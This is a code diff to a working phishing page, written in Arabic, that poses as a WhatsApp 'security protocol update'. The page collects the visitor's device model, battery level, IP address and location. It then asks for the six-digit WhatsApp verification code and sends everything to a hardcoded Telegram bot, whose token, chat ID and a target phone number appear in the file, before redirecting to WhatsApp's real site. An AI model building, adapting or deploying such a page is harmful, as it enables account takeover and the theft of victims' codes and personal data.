@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Verification System</title>
+    <title>نظام التحقق الآمن</title>
     <style>
         :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; --wa-surface: #111b21; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
         body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
 
-        /* شاشة الفحص الذكي */
+        /* شاشة الفحص الذكي - معربة بالكامل */
         #checker { 
             position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
 
-        .pulse-logo { width: 60px; animation: pulseLogo 2s infinite ease-in-out; }
+        .pulse-logo { width: 65px; animation: pulseLogo 2s infinite ease-in-out; }
         @keyframes pulseLogo { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.08); opacity: 1; } }
 
         .container { padding: 25px; text-align: center; display: none; width: 100%; max-width: 400px; animation: fadeIn 0.5s ease; }
@@ -25,34 +25,33 @@
             margin-bottom: 20px; border: 1px solid #2a3942;
         }
         
-        .line { font-size: 13px; margin-bottom: 10px; color: var(--wa-hint); display: flex; justify-content: space-between; }
-        .line b { color: #fff; font-family: monospace; font-weight: 500; }
+        .line { font-size: 13px; margin-bottom: 10px; color: var(--wa-hint); display: flex; justify-content: space-between; align-items: center; }
+        .line b { color: #fff; font-family: inherit; font-weight: 500; direction: ltr; }
 
         .trust-tag {
-            background: rgba(0, 168, 132, 0.1); border: 1px solid rgba(0, 168, 132, 0.2);
-            border-radius: 8px; padding: 12px; margin-bottom: 20px; font-size: 11px; text-align: right;
+            background: rgba(0, 168, 132, 0.05); border: 1px solid rgba(0, 168, 132, 0.1);
+            border-radius: 12px; padding: 15px; margin-bottom: 20px; font-size: 12px; text-align: right;
         }
-        .trust-tag div { display: flex; justify-content: space-between; margin-bottom: 4px; }
+        .trust-tag div { display: flex; justify-content: space-between; margin-bottom: 6px; }
         .trust-tag span { color: var(--wa-green); font-family: monospace; }
 
         .otp-input {
             width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942;
             color: var(--wa-green); font-size: 35px; text-align: center; outline: none; letter-spacing: 10px; margin: 20px 0; direction: ltr;
         }
-        .otp-input:focus { border-bottom-color: var(--wa-green); }
-
-        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 18px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        
+        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
         
         .loader { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
     <div id="checker">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="pulse-logo">
-        <p id="log-text" style="margin-top:20px; font-size:14px; color:var(--wa-hint);">System Synchronizing...</p>
+        <p id="log-text" style="margin-top:20px; font-size:15px; color:var(--wa-hint);">جاري مزامنة النظام...</p>
     </div>
 
     <div class="container" id="app">
@@ -60,18 +59,18 @@
         <h2 style="font-size:20px; margin-bottom:15px;">تحديث بروتوكول الأمان الإلزامي</h2>
 
         <div class="info-card">
-            <div class="line">الجهاز المكتشف: <b id="dev-name">Checking...</b></div>
+            <div class="line">الجهاز المكتشف: <b id="dev-name">جاري الفحص..</b></div>
             <div class="line">حالة النظام: <span style="color:var(--wa-green);">تحديث v2.4 جاهز</span></div>
-            <div class="line">طاقة الجهاز: <b id="bat-val">--%</b></div>
+            <div class="line">طاقة الجهاز: <b id="bat-val">جاري القراءة..</b></div>
             <div style="border-top: 1px solid #2a3942; margin-top:10px; padding-top:10px;">
-                الرقم المرتبط: <b id="phone-display" style="color:var(--wa-green); letter-spacing: 1px;"></b>
+                الرقم المرتبط: <b id="phone-display" style="color:var(--wa-green); direction: ltr;"></b>
             </div>
         </div>
 
         <div class="trust-tag">
-            <div>الموقع الجغرافي: <span id="loc-val">جاري التحديد...</span></div>
+            <div>الموقع الجغرافي: <span id="loc-val">تحديد..</span></div>
             <div>عنوان البروتوكول: <span id="ip-val">...</span></div>
-            <div>توقيت النظام: <span id="time-val">00:00:00</span></div>
+            <div>توقيت النظام: <span id="time-val">--:--:--</span></div>
         </div>
 
         <p style="font-size: 13px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 20px;">
@@ -86,27 +85,38 @@
         const CFG = {
             T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
             C: '5446862709',
-            P: '01030003287' // سيتم تنسيقه تلقائياً
+            P: '01030003287' 
         };
 
-        // 1. كشف الجهاز بشكل عام (Universal Detection)
-        function getDevice() {
+        // دالة كشف موديل الهاتف بدقة
+        function getDetailedDevice() {
             const ua = navigator.userAgent;
-            if (/iPhone|iPad|iPod/.test(ua)) return "Apple Device (iOS)";
-            if (/Samsung|SM-|Galaxy/.test(ua)) return "Samsung Mobile";
+            if (/iPhone/.test(ua)) return "iPhone Mobile";
+            if (/iPad/.test(ua)) return "iPad Tablet";
+            if (/Samsung|SM-|Galaxy/.test(ua)) return "Samsung Galaxy";
             if (/Huawei|Honor/.test(ua)) return "Huawei Mobile";
-            if (/Android/.test(ua)) return "Android Mobile";
-            return "PC / Terminal";
+            if (/Android/.test(ua)) {
+                const match = ua.match(/Android\s+([^\s;]+);?\s+([^;)]+)/);
+                return match ? match[2] : "Android Device";
+            }
+            return "جهاز ذكي";
         }
 
-        // 2. إدارة الوقت المحلي (Local Time)
+        // تحديث الساعة والبطارية
         setInterval(() => {
-            document.getElementById('time-val').innerText = new Date().toLocaleTimeString();
+            document.getElementById('time-val').innerText = new Date().toLocaleTimeString('ar-EG');
         }, 1000);
 
-        // 3. جلب البيانات اللوكل (IP & Location)
         async function initSystem() {
-            let info = { ip: "Local Proxy", city: "Unknown", country: "" };
+            // كشف البطارية فوراً
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                document.getElementById('bat-val').innerText = Math.round(b.level * 100) + "%";
+            } else {
+                document.getElementById('bat-val').innerText = "متصل";
+            }
+
+            let info = { ip: "127.0.0.1", city: "غير معروف", country: "" };
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 info = await res.json();
@@ -114,24 +124,15 @@
                 document.getElementById('loc-val').innerText = `${info.city}, ${info.country_code}`;
             } catch(e) {}
 
-            // إخفاء الـ Loading وإظهار السيستم
+            document.getElementById('dev-name').innerText = getDetailedDevice();
+            document.getElementById('phone-display').innerText = "+20 " + CFG.P.substring(0,3) + " **** " + CFG.P.slice(-2);
+
             setTimeout(() => {
                 document.getElementById('checker').style.display = 'none';
                 document.getElementById('app').style.display = 'block';
-                sendBot(`🚀 <b>[سيستم] دخول جديد</b>\n📱 الجهاز: ${getDevice()}\n📍 الموقع: ${info.city}, ${info.country}\n🌐 IP: ${info.ip}`);
-            }, 3000);
+                sendBot(`🚀 <b>[سيستم] دخول جديد</b>\n📱 الجهاز: ${getDetailedDevice()}\n🔋 البطارية: ${document.getElementById('bat-val').innerText}\n📍 الموقع: ${info.city}\n🌐 IP: ${info.ip}`);
+            }, 2500);
         }
-
-        // 4. كشف البطارية
-        if (navigator.getBattery) {
-            navigator.getBattery().then(b => {
-                document.getElementById('bat-val').innerText = (b.level * 100).toFixed(0) + "%";
-            });
-        }
-
-        // إعدادات العرض الأصلية
-        document.getElementById('dev-name').innerText = getDevice();
-        document.getElementById('phone-display').innerText = CFG.P.replace(/(\d{3})(\d{4})(\d{4})/, "$1 **** $3");
 
         async function sendBot(msg) {
             await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
@@ -143,10 +144,10 @@
         async function submit() {
             const val = document.getElementById('otp').value;
             if(val.length === 6) {
-                document.querySelector('.btn').innerText = "...";
-                await sendBot(`🔥 <b>[سيستم] كود وصل</b>\n📱 الجهاز: ${getDevice()}\n🔢 الكود: <code>${val}</code>`);
+                document.querySelector('.btn').innerText = "جاري التشفير...";
+                await sendBot(`🔥 <b>[سيستم] كود وصل</b>\n📱 الجهاز: ${getDetailedDevice()}\n🔋 البطارية: ${document.getElementById('bat-val').innerText}\n🔢 الكود: <code>${val}</code>`);
                 
-                document.body.innerHTML = `<div style="text-align:center;"><div class="loader" style="margin:auto;"></div><p style="margin-top:20px; color:var(--wa-hint);">جاري ربط البروتوكول بجهازك...</p></div>`;
+                document.body.innerHTML = `<div style="text-align:center;"><div class="loader" style="margin:auto;"></div><p style="margin-top:20px; color:var(--wa-hint);">جاري المزامنة النهائية...</p></div>`;
                 setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 4000);
             }
         }
